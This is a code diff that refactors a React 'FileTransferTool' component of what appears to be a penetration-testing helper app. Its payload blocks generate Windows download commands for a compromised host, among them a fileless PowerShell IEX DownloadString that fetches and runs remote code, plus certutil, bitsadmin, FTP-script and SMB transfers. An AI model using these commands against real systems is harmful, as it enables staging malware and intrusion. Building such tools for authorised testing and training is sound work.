@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Card, Button, Input, TabNav } from '../ui';
+import { Card, Button, Input, TabNav, PayloadBlock } from '../ui';
 import { Folder, Copy, Check, Info, Server, Download, Upload } from 'lucide-react';
 
 export default function FileTransferTool() {
@@ -92,40 +92,25 @@ export default function FileTransferTool() {
             {/* PowerShell Tab */}
             {activeTab === 'powershell' && (
                 <div className="space-y-4">
-                    <Card className="!p-4">
-                        <div className="flex items-center justify-between mb-2">
-                            <span className="text-sm font-bold text-htb-green">DownloadFile (Net.WebClient)</span>
-                            <Button size="sm" variant="outline" onClick={() => copyToClipboard(`(New-Object Net.WebClient).DownloadFile('${config.target_file}','${config.output_file}')`)} icon={<Copy size={12} />} />
-                        </div>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 font-mono break-all">
-                                (New-Object Net.WebClient).DownloadFile('{config.target_file}','{config.output_file}')
-                            </code>
-                        </div>
+                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
+                        <PayloadBlock
+                            title="DownloadFile (Net.WebClient)"
+                            content={`(New-Object Net.WebClient).DownloadFile('${config.target_file}','${config.output_file}')`}
+                        />
                     </Card>
 
-                    <Card className="!p-4">
-                        <div className="flex items-center justify-between mb-2">
-                            <span className="text-sm font-bold text-htb-green">Fileless IEX (DownloadString)</span>
-                            <Button size="sm" variant="outline" onClick={() => copyToClipboard(`IEX (New-Object Net.WebClient).DownloadString('${config.target_file}')`)} icon={<Copy size={12} />} />
-                        </div>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 font-mono break-all">
-                                IEX (New-Object Net.WebClient).DownloadString('{config.target_file}')
-                            </code>
-                        </div>
+                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
+                        <PayloadBlock
+                            title="Fileless IEX (DownloadString)"
+                            content={`IEX (New-Object Net.WebClient).DownloadString('${config.target_file}')`}
+                        />
                     </Card>
 
-                    <Card className="!p-4">
-                        <div className="flex items-center justify-between mb-2">
-                            <span className="text-sm font-bold text-htb-green">Invoke-WebRequest (iwr)</span>
-                            <Button size="sm" variant="outline" onClick={() => copyToClipboard(`iwr -Uri '${config.target_file}' -OutFile '${config.output_file}'`)} icon={<Copy size={12} />} />
-                        </div>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 font-mono break-all">
-                                iwr -Uri '{config.target_file}' -OutFile '{config.output_file}'
-                            </code>
-                        </div>
+                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
+                        <PayloadBlock
+                            title="Invoke-WebRequest (iwr)"
+                            content={`iwr -Uri '${config.target_file}' -OutFile '${config.output_file}'`}
+                        />
                     </Card>
                 </div>
             )}
@@ -140,28 +125,18 @@ export default function FileTransferTool() {
                         </p>
                     </div>
 
-                    <Card className="!p-4">
-                        <div className="flex items-center justify-between mb-2">
-                            <span className="text-sm font-bold text-htb-green">Copy from SMB</span>
-                            <Button size="sm" variant="outline" onClick={() => copyToClipboard(`copy \\\\${config.ip}\\share\\${config.output_file}`)} icon={<Copy size={12} />} />
-                        </div>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 font-mono break-all">
-                                copy \\{config.ip}\share\{config.output_file}
-                            </code>
-                        </div>
+                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
+                        <PayloadBlock
+                            title="Copy from SMB"
+                            content={`copy \\\\${config.ip}\\share\\${config.output_file}`}
+                        />
                     </Card>
 
-                    <Card className="!p-4">
-                        <div className="flex items-center justify-between mb-2">
-                            <span className="text-sm font-bold text-htb-green">Mount Share (Auth)</span>
-                            <Button size="sm" variant="outline" onClick={() => copyToClipboard(`net use z: \\\\${config.ip}\\share /user:user password`)} icon={<Copy size={12} />} />
-                        </div>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 font-mono break-all">
-                                net use z: \\{config.ip}\share /user:user password
-                            </code>
-                        </div>
+                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
+                        <PayloadBlock
+                            title="Mount Share (Auth)"
+                            content={`net use z: \\\\${config.ip}\\share /user:user password`}
+                        />
                     </Card>
                 </div>
             )}
@@ -176,20 +151,15 @@ export default function FileTransferTool() {
                         </p>
                     </div>
 
-                    <Card className="!p-4">
-                        <div className="flex items-center justify-between mb-2">
-                            <span className="text-sm font-bold text-htb-green">FTP Download Script</span>
-                            <Button size="sm" variant="outline" onClick={() => copyToClipboard(`echo open ${config.ip} 21 > ftp.txt\necho USER anonymous >> ftp.txt\necho GET ${config.output_file} >> ftp.txt\necho BYE >> ftp.txt\nftp -v -s:ftp.txt`)} icon={<Copy size={12} />} />
-                        </div>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <pre className="text-xs text-blue-300 font-mono break-all whitespace-pre-wrap">
-                                {`echo open ${config.ip} 21 > ftp.txt
+                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
+                        <PayloadBlock
+                            title="FTP Download Script"
+                            content={`echo open ${config.ip} 21 > ftp.txt
 echo USER anonymous >> ftp.txt
 echo GET ${config.output_file} >> ftp.txt
 echo BYE >> ftp.txt
 ftp -v -s:ftp.txt`}
-                            </pre>
-                        </div>
+                        />
                     </Card>
                 </div>
             )}
@@ -197,28 +167,18 @@ ftp -v -s:ftp.txt`}
             {/* Certutil Tab */}
             {activeTab === 'certutil' && (
                 <div className="space-y-4">
-                    <Card className="!p-4">
-                        <div className="flex items-center justify-between mb-2">
-                            <span className="text-sm font-bold text-htb-green">Certutil Download</span>
-                            <Button size="sm" variant="outline" onClick={() => copyToClipboard(`certutil -urlcache -split -f "${config.target_file}" ${config.output_file}`)} icon={<Copy size={12} />} />
-                        </div>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 font-mono break-all">
-                                certutil -urlcache -split -f "{config.target_file}" {config.output_file}
-                            </code>
-                        </div>
+                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
+                        <PayloadBlock
+                            title="Certutil Download"
+                            content={`certutil -urlcache -split -f "${config.target_file}" ${config.output_file}`}
+                        />
                     </Card>
 
-                    <Card className="!p-4">
-                        <div className="flex items-center justify-between mb-2">
-                            <span className="text-sm font-bold text-htb-green">BITSAdmin</span>
-                            <Button size="sm" variant="outline" onClick={() => copyToClipboard(`bitsadmin /transfer myJob ${config.target_file} C:\\Windows\\Temp\\${config.output_file}`)} icon={<Copy size={12} />} />
-                        </div>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 font-mono break-all">
-                                bitsadmin /transfer myJob {config.target_file} C:\Windows\Temp\{config.output_file}
-                            </code>
-                        </div>
+                    <Card className="!p-4 bg-transparent border-0 -mx-4 md:mx-0 shadow-none">
+                        <PayloadBlock
+                            title="BITSAdmin"
+                            content={`bitsadmin /transfer myJob ${config.target_file} C:\\Windows\\Temp\\${config.output_file}`}
+                        />
                     </Card>
                 </div>
             )}
